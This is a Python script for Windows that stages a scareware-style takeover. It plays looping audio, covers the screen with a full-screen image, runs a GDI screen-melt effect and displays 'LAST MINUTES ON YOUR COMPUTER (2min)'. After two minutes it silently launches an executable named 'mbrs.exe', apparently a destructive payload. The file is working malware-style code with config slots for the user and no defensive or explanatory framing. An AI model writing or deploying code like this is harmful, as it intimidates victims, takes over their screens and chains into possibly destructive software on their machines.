import win32gui
import win32con
import ctypes
import random
import time
import os
import pygame
from PIL import Image
from PIL import ImageTk
import tkinter as tk
import subprocess

# Setup
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

# Config
mp3_file = "scary.mp3"       # Place your .mp3 in same directory
image_file = "yourimage.jpg"     # Place your image in same directory
app_to_run = "mbrs.exe"       # App to open after timer
custom_text = "LAST MINUTES ON YOUR COMPUTER (2min)"     # Text to show
duration = 120                   # Seconds

# Start music
pygame.mixer.init()
pygame.mixer.music.load(mp3_file)
pygame.mixer.music.play(-1)

# Show Image
def show_image():
    root = tk.Tk()
    root.title("Image")
    root.geometry(f"{w}x{h}+0+0")
    root.overrideredirect(True)
    img = Image.open(image_file)
    img = img.resize((w, h))
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(root, image=tk_img)
    label.pack()
    root.after(duration * 1000, root.destroy)
    root.mainloop()

# Display custom text with GDI
def draw_text(text):
    hdc = win32gui.GetDC(0)
    font = win32gui.CreateFont(
        -40, 0, 0, 0, win32con.FW_BOLD, False, False, False,
        win32con.ANSI_CHARSET, win32con.OUT_DEFAULT_PRECIS,
        win32con.CLIP_DEFAULT_PRECIS, win32con.DEFAULT_QUALITY,
        win32con.DEFAULT_PITCH | win32con.FF_DONTCARE,
        "Arial"
    )
    old_font = win32gui.SelectObject(hdc, font)
    win32gui.SetTextColor(hdc, 0x00FFFF)  # Cyan
    win32gui.SetBkMode(hdc, win32con.TRANSPARENT)
    win32gui.TextOut(hdc, int(w/2 - 150), int(h/2 - 50), text, len(text))
    win32gui.SelectObject(hdc, old_font)
    win32gui.ReleaseDC(0, hdc)

# GDI visual thread
def gdi_effect():
    start = time.time()
    while time.time() - start < duration:
        hdc = win32gui.GetDC(0)
        x = random.randint(0, w - 10)
        win32gui.BitBlt(hdc, x, 1, 10, h, hdc, x, 0, win32con.SRCCOPY)
        draw_text(custom_text)
        win32gui.ReleaseDC(0, hdc)
        time.sleep(0.02)

# Run image in parallel
import threading
threading.Thread(target=show_image, daemon=True).start()

# Start GDI effect
gdi_effect()

# Stop music
pygame.mixer.music.stop()

# Launch app
subprocess.Popen(os.path.join(os.getcwd(), app_to_run), shell=True)
